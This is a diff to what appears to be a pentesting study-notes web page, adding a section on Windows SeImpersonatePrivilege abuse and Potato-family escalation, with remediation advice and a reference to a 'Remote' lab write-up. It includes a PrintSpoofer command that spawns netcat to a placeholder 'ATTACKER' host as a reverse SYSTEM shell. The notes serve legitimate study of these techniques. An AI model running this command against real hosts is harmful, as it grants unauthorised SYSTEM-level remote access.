@@ -27,6 +27,7 @@
     <p class="toc-label">Windows / Active Directory</p>
     <nav id="tocNav">
       <a href="#tokens" data-toc>Access tokens &amp; privileges</a>
+      <a href="#seimpersonate" data-toc>SeImpersonate &amp; Potato</a>
       <a href="#sebackupprivilege" data-toc>SeBackupPrivilege</a>
       <a href="#ntds" data-toc>NTDS.dit</a>
       <a href="#pass-the-hash" data-toc>Pass-the-Hash</a>
@@ -90,6 +91,64 @@
         <span class="lbl">seen in</span>
         <a href="writeup-baby.html">Baby</a> - a standard user in Backup Operators held
         <code>SeBackupPrivilege</code>, visible straight away from <code>whoami /priv</code>.
+      </div>
+    </section>
+
+    <!-- ============ SeImpersonate & Potato ============ -->
+    <section id="seimpersonate" class="concept-block">
+      <p class="kicker">Service-account privilege to SYSTEM</p>
+      <h2>SeImpersonate &amp; Potato attacks</h2>
+
+      <div class="concept-sub">
+        <span class="sub-lbl">what it is</span>
+        <p><code>SeImpersonatePrivilege</code> lets a process impersonate another user's token <em>after</em>
+        that user authenticates to it. Service accounts like IIS's <code>defaultapppool</code> hold it for a
+        legitimate reason: a web server has to briefly act on behalf of each user that connects. The catch -
+        if you can trick a more privileged account, specifically <strong>SYSTEM</strong>, into authenticating
+        to something you control, you can impersonate its token and inherit its power.</p>
+      </div>
+
+      <div class="concept-sub">
+        <span class="sub-lbl">the chain in one line</span>
+        <p>You hold SeImpersonate, but you need SYSTEM to actually connect to you and hand over a token. You
+        can't ask it nicely, so you <strong>coerce</strong> it:</p>
+        <p style="margin-top:8px">hold SeImpersonate &rarr; coerce a SYSTEM service to connect to your named
+        pipe &rarr; steal its token &rarr; spawn your command with that token &rarr; SYSTEM shell.</p>
+      </div>
+
+      <div class="concept-sub">
+        <span class="sub-lbl">PrintSpoofer, concretely</span>
+        <p>PrintSpoofer coerces the <strong>Print Spooler</strong> service (which runs as SYSTEM) into
+        connecting to a named pipe it controls, via the RPC call
+        <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code>. When SYSTEM connects, PrintSpoofer grabs
+        its token off the pipe and calls <code>CreateProcessAsUser</code> to launch whatever was passed with
+        <code>-c</code> - here, a netcat back to a listener, running as SYSTEM.</p>
+        <pre><code>PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe ATTACKER 4445 -e cmd.exe"</code></pre>
+      </div>
+
+      <div class="concept-sub">
+        <span class="sub-lbl">the Potato family (pick the right one)</span>
+        <p>PrintSpoofer, JuicyPotato, RoguePotato, GodPotato, and RottenPotato all do the same core thing -
+        coerce a SYSTEM service to authenticate, then impersonate the token - differing in <em>how</em> they
+        trigger the callback and which service they abuse. JuicyPotato used DCOM and was patched on newer
+        Windows; PrintSpoofer uses the Spooler and works on Server 2016/2019 and Windows 10. The single
+        requirement for all of them is <code>SeImpersonate</code> (confirm with <code>whoami /priv</code>).
+        Watch the preconditions: RogueWinRM, for example, needs port <strong>5985 free</strong> because it
+        fakes a WinRM service, so it fails on a host where WinRM is already listening.</p>
+      </div>
+
+      <div class="concept-sub">
+        <span class="sub-lbl">hardening / remediation</span>
+        <p>The privilege itself is needed for services to function, so defend in depth: keep Windows patched
+        against the DCOM/RPC vectors, disable the Print Spooler where it isn't required, and contain the web
+        app so the RCE that hands an attacker a SeImpersonate shell in the first place is harder to reach.</p>
+      </div>
+
+      <div class="seen-in">
+        <span class="lbl">seen in</span>
+        <a href="writeup-remote.html">Remote</a> - the IIS <code>defaultapppool</code> account held
+        <code>SeImpersonatePrivilege</code>; RogueWinRM failed (5985 in use), and PrintSpoofer abused the
+        Print Spooler for a SYSTEM shell.
       </div>
     </section>
 
